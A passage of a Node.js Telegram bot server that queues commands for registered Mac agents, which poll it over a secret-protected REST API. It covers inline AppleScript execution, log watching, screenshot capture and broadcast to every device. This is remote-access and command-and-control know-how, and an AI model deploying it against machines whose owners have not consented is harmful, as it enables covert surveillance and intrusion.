bot.hears(/^\/logwatch(?: @?([\w.-]+))? (\S+) (\d+)$/, async (ctx) => {
  if (!isAuthorized(ctx)) return;
  const target = ctx.match[1];
  const proc   = ctx.match[2].trim();
  const secs   = ctx.match[3];
  const cmd    = `__mackit__:logwatch ${proc} ${secs}`;
  const chatId = ctx.chat.id;
  if (target) {
    const device = await resolveDevice(target);
    if (!device) return reply(chatId, `Device \`${target}\` not found. See /devices.`);
    enqueue(chatId, device.deviceId, device.hostname, cmd);
  } else {
    await broadcast(chatId, cmd, `/logwatch ${proc} ${secs}s`);
  }
});

// /script [@host] <applescript>  – run AppleScript inline
bot.hears(/^\/script(?: @?([\w.-]+))? ([\s\S]+)$/, async (ctx) => {
  if (!isAuthorized(ctx)) return;
  const target = ctx.match[1];
  const code   = ctx.match[2].trim();
  const cmd    = `__mackit__:script ${code}`;
  const chatId = ctx.chat.id;
  if (target) {
    const device = await resolveDevice(target);
    if (!device) return reply(chatId, `Device \`${target}\` not found. See /devices.`);
    enqueue(chatId, device.deviceId, device.hostname, cmd);
  } else {
    await broadcast(chatId, cmd, `/script ...`);
  }
});

// ─── Core: enqueue + broadcast ────────────────────────────────────────────────
async function broadcast(chatId, cmd, label, type) {
  const devices = await getDevices();
  if (!devices.length) return reply(chatId, 'No devices registered yet.');
  reply(chatId, `📡 Broadcasting to *${devices.length}* Mac(s):\n\`\`\`\n${label}\n\`\`\``);
  for (const d of devices) enqueue(chatId, d.deviceId, d.hostname, cmd, type);
}

function enqueue(chatId, deviceId, hostname, cmd, type) {
  const id = uuidv4();
  if (!deviceQueues[deviceId]) deviceQueues[deviceId] = [];
  deviceQueues[deviceId].push({ id, cmd, chatId, requestedAt: Date.now() });
  waitForResult(id, chatId, hostname, cmd, type);
}

function waitForResult(id, chatId, hostname, cmd, type, deadline = Date.now() + 90_000) {
  const tick = () => {
    if (resultStore[id]) {
      const { output, exitCode } = resultStore[id];
      delete resultStore[id];

      if (type === 'screenshot' && exitCode === 0 && output.trim().length > 0) {
        // Strip all whitespace (macOS base64 wraps at 76 chars) before decoding.
        const b64 = output.replace(/\s/g, '');
        const buf = Buffer.from(b64, 'base64');
        bot.telegram.sendPhoto(
          chatId,
          { source: buf },
          { caption: `📸 *${hostname}*`, parse_mode: 'Markdown' },
        ).catch((err) => {
          console.error(`[bot] sendPhoto failed for ${hostname}:`, err.message);
          reply(chatId, `📋 *${hostname}* — screenshot failed: ${err.message}`);
        });
        return;
      }

      const text = output.length > 3500
        ? output.slice(0, 3500) + '\n…(truncated)'
        : output || '(no output)';
      reply(chatId, `📋 *${hostname}* \\(exit ${exitCode}\\)\n\`\`\`\n${text}\n\`\`\``);
      return;
    }
    if (Date.now() > deadline) {
      reply(chatId, `⏰ *${hostname}* — no response for: \`${cmd.slice(0, 60)}\``);
      return;
    }
    setTimeout(tick, 1500);
  };
  setTimeout(tick, 1500);
}

// ─── Config sync (keeps AGENT_SECRET in sync with Firebase) ──────────────────
// After the Firebase migration the .env value and the Firebase value can drift.
// We fix this by fetching the canonical secret from the config server on startup
// and then refreshing it every 5 minutes so /setsecret changes propagate here
// automatically without needing a bot restart.
let _configSyncVersion = -1;

async function syncConfigFromServer() {
  try {
    const cfg = await configReq('GET', '/api/config');
    if (cfg.agentSecret && cfg.agentSecret !== process.env.AGENT_SECRET) {
      process.env.AGENT_SECRET = cfg.agentSecret;
      console.log(`[bot] AGENT_SECRET synced from config server (config v${cfg.version ?? '?'}).`);
    }
    _configSyncVersion = cfg.version ?? _configSyncVersion;
  } catch (e) {
    console.error('[bot] Failed to sync config from server:', e.message);
  }
}

// ─── Express REST API (Mac agents connect here) ───────────────────────────────
const app = express();
app.set('trust proxy', 1); // required when behind localtunnel / reverse proxy
app.use(helmet());
app.use(express.json({ limit: '20mb' }));
app.use('/api', rateLimit({ windowMs: 10_000, max: 60 }));

// Agent auth — reads process.env.AGENT_SECRET which is kept fresh by syncConfigFromServer()
app.use('/api', (req, res, next) => {
  if (req.headers['x-agent-secret'] !== process.env.AGENT_SECRET) {
    return res.status(401).json({ error: 'unauthorized' });
  }
  next();
});

// GET /api/command?device=<deviceId>
app.get('/api/command', (req, res) => {
  const { device } = req.query;
  if (!device) return res.status(400).json({ error: 'device query param required' });
  const queue = deviceQueues[device] ?? [];
  if (!queue.length) return res.status(204).end();
  res.json(queue.shift());
});

// POST /api/result  { id, deviceId, hostname, output, exitCode }
app.post('/api/result', (req, res) => {
  const { id, output, exitCode } = req.body;
  if (!id) return res.status(400).json({ error: 'id required' });
  resultStore[id] = { output: String(output ?? ''), exitCode: Number(exitCode ?? -1), finishedAt: Date.now() };
  res.json({ ok: true });
});

// POST /api/alert  { deviceId, hostname, message }
app.post('/api/alert', (req, res) => {
  const { hostname, message } = req.body ?? {};
  if (!message) return res.status(400).json({ error: 'message required' });
  bot.telegram.sendMessage(ALLOWED_CHAT_ID, `🔔 *Alert from ${hostname ?? 'Mac'}*\n${message}`, { parse_mode: 'Markdown' });
  res.json({ ok: true });
});

// GET /health
app.get('/health', (_req, res) => res.json({ ok: true, uptime: process.uptime() }));

// ─── Startup ──────────────────────────────────────────────────────────────────
(async () => {
  // Pull the canonical agentSecret from Firebase before accepting connections.
  // This fixes the post-Firebase-migration gap where the .env value lags behind.
  console.log('[bot] Syncing config from server before startup...');
  await syncConfigFromServer();

  if (!process.env.AGENT_SECRET) {
    console.error('[bot] AGENT_SECRET is still empty after sync — agents will not be able to authenticate. Set it with /setsecret.');
  }

  // Keep re-syncing every 5 min so /setsecret changes propagate without a restart.
  setInterval(syncConfigFromServer, 5 * 60 * 1000);

  app.listen(PORT, () => {
    console.log(`[bot] Listening on :${PORT}`);
    console.log(`[bot] Authorized chat: ${ALLOWED_CHAT_ID}`);
  });

  // Start Telegraf long-polling
  await bot.launch();
  console.log('[bot] Telegraf polling started.');

  // Graceful shutdown
  process.once('SIGINT',  () => bot.stop('SIGINT'));
  process.once('SIGTERM', () => bot.stop('SIGTERM'));
})();
